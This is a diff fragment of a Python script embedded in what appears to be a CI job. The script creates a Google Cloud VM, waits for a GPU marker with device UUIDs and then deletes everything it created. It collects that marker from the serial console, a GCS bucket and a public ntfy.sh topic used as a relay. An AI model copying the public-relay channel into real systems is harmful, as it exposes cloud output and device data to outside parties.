+                      base = 'https://compute.googleapis.com/compute/v1/projects/%s/zones/%s' % (PNAME, zone)
+                      # pre-clean any leftover of ours in this zone
+                      stp, rbp = g(base + '/instances/' + instname, tries=1)
+                      if stp == 200:
+                          g(base + '/instances/' + instname, method=M_DEL, tries=1)
+                          time.sleep(5)
+                      st, rb = g(base + '/instances', data=json.dumps(ibody).encode(), timeout=120, tries=1)
+                      mrec = {'instance': instname, 'zone': zone, 'region': chosen['region'],
+                              'family': chosen, 'create': sig(st, rb), 'create_raw': short(rb, 600),
+                              'sink_bucket': bucket, 'topic': TOPIC, 'image': IMG}
+                      log('marker create', st, mrec['create'].get('message'))
+                      jc = jl(rb)
+                      opname = jc.get('name')
+                      if st == 200 and opname:
+                          mrec['create_op'] = poll_op(base + '/operations/' + opname.rsplit('/', 1)[-1], 240)
+                          # wait for RUNNING
+                          running = False
+                          t0 = time.time()
+                          while time.time() - t0 < 360:
+                              sti, rbi = g(base + '/instances/' + instname, tries=1)
+                              ji = jl(rbi)
+                              mrec['instance_status'] = ji.get('status')
+                              if sti == 200 and ji.get('status') == 'RUNNING':
+                                  running = True
+                                  break
+                              if sti == 404:
+                                  break
+                              time.sleep(8)
+                          mrec['running'] = running
+                          # capture: serial console + ntfy + GCS
+                          cap = {'serial_samples': 0, 'serial_tail': '', 'ntfy': None, 'gcs': None,
+                                 'marker_text': '', 'source': None}
+                          t0 = time.time()
+                          while time.time() - t0 < 660:
+                              sts, rbs = g(base + '/instances/%s/serialPortOutput?port=1' % instname, tries=1)
+                              if sts != 200:
+                                  sts, rbs = g(base + '/instances/%s/serialPort?port=1' % instname, tries=1)
+                              cap['serial_http'] = sts
+                              if sts == 200:
+                                  cont = jl(rbs).get('contents') or ''
+                                  try:
+                                      txt = base64.b64decode(cont).decode('utf-8', 'replace')
+                                  except Exception:
+                                      txt = cont
+                                  cap['serial_samples'] += 1
+                                  if txt:
+                                      cap['serial_tail'] = txt[-2500:]
+                                  if 'C211-I82091-NVSMI-Q' in txt and 'C211_I82091_END' in txt:
+                                      cap['marker_text'] = txt[-6000:]
+                                      cap['source'] = 'serial'
+                                      break
+                              # ntfy
+                              stn2, rbn2 = g('https://ntfy.sh/%s/json?poll=1&since=all' % Q(TOPIC, safe=''), tries=1)
+                              best = ''
+                              for ln in (rbn2 or '').splitlines():
+                                  try:
+                                      mm = json.loads(ln)
+                                  except Exception:
+                                      continue
+                                  if mm.get('event') != 'message':
+                                      continue
+                                  raw = mm.get('message') or ''
+                                  try:
+                                      dec = base64.b64decode(raw, validate=True).decode('utf-8', 'replace')
+                                      t2 = dec if 'C211-I82091' in dec else raw
+                                  except Exception:
+                                      t2 = raw
+                                  if 'C211-I82091-NVSMI-Q' in t2:
+                                      best = t2
+                              if best:
+                                  cap['ntfy'] = {'n': 1, 'text': best[-4000:]}
+                                  cap['marker_text'] = best[-6000:]
+                                  cap['source'] = 'ntfy'
+                                  break
+                              # gcs
+                              if bucket:
+                                  stg, rbg = g('https://storage.googleapis.com/storage/v1/b/%s/o/%s?alt=media'
+                                               % (Q(bucket, safe=''), Q(objname, safe='')), tries=1)
+                                  if stg == 200:
+                                      cap['gcs'] = {'http': stg, 'text': rbg[-4000:]}
+                                      if 'C211-I82091-NVSMI-Q' in rbg:
+                                          cap['marker_text'] = rbg[-6000:]
+                                          cap['source'] = 'gcs'
+                                          break
+                              time.sleep(12)
+                          cap['uuids'] = uuids_of(cap.get('marker_text') or '')
+                          mrec['capture'] = cap
+                          log('capture', cap.get('source'), cap.get('uuids'))
+                          # delete VM + readback
+                          std, rbd = g(base + '/instances/' + instname, method=M_DEL, tries=1)
+                          mrec['delete_http'] = std
+                          jd = jl(rbd)
+                          if jd.get('name'):
+                              mrec['delete_op'] = poll_op(base + '/operations/' + jd['name'].rsplit('/', 1)[-1], 240)
+                          time.sleep(4)
+                          str_, rbr = g(base + '/instances/' + instname, tries=1)
+                          mrec['readback'] = {'http': str_, 'err': short(rbr, 400)}
+                          # remove the GCS marker object
+                          if bucket:
+                              sto, rbo = g('https://storage.googleapis.com/storage/v1/b/%s/o/%s'
+                                           % (Q(bucket, safe=''), Q(objname, safe='')), method=M_DEL, tries=1)
+                              mrec['gcs_object_delete'] = {'http': sto, 'err': short(rbo, 200)}
+                              stq, rbq = g('https://storage.googleapis.com/storage/v1/b/%s/o/%s'
+                                           % (Q(bucket, safe=''), Q(objname, safe='')), tries=1)
+                              mrec['gcs_object_readback'] = {'http': stq, 'err': short(rbq, 160)}
+                          marker = mrec
+                          if mrec['capture'].get('uuids'):
+                              out['verdict'] = 'DEVICE_PROVEN'
+                          else:
+                              out['verdict'] = 'GATE_MARKER_NO_UUID'
+                      else:
+                          mrec['verdict'] = 'CREATE_FAILED'
+                          out['verdict'] = 'GATE_MARKER_CREATE_FAILED'
+                          marker = mrec
+                          # ensure cleanup if the create actually succeeded but returned odd status
+                          stc, rbc = g(base + '/instances/' + instname, tries=1)
+                          if stc == 200:
+                              g(base + '/instances/' + instname, method=M_DEL, tries=1)
+              out['marker'] = marker
+
+              # ---------------- 14) zero-remnant sweep ----------------
+              st, rb = g('https://compute.googleapis.com/compute/v1/projects/%s/aggregated/instances?maxResults=500' % PNAME, tries=1)
+              j = jl(rb)
+              ours = []
+              for zk, v in (j.get('items') or {}).items():
+                  for i in (v.get('instances') or []):
+                      if (i.get('name') or '').startswith(PREFIX):
+                          ours.append({'name': i.get('name'), 'zone': (i.get('zone') or '').rsplit('/', 1)[-1],
+                                       'status': i.get('status')})
+              out['leftover_sweep'] = {'http': st, 'ours': ours, 'err': short(rb, 300) if st != 200 else ''}
+              out['t_end'] = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+              out = redact(out, [A, GH_TOKEN, tok])
+              emit(out)
+              print('DONE verdict=%s' % out.get('verdict'), flush=True)
+
+
+          def redact(o, secrets):
+              if isinstance(o, str):
+                  s = o
+                  for sec in secrets:
+                      if sec:
+                          s = s.replace(sec, 'REDACTED')
+                  return s
+              if isinstance(o, list):
+                  return [redact(x, secrets) for x in o]
+              if isinstance(o, dict):
+                  return {k: redact(v, secrets) for k, v in o.items()}
+              return o
+
+
+          A = None
+          if __name__ == '__main__':
+              try:
+                  main()
+              except Exception as ex:
+                  import traceback
+                  print('FATAL ' + repr(ex), flush=True)
+                  traceback.print_exc()
+                  try:
+                      emit({'fatal': repr(ex)[:400], 'stage': 'fatal'})
+                  except Exception:
+                      pass
+          PYSCRIPT
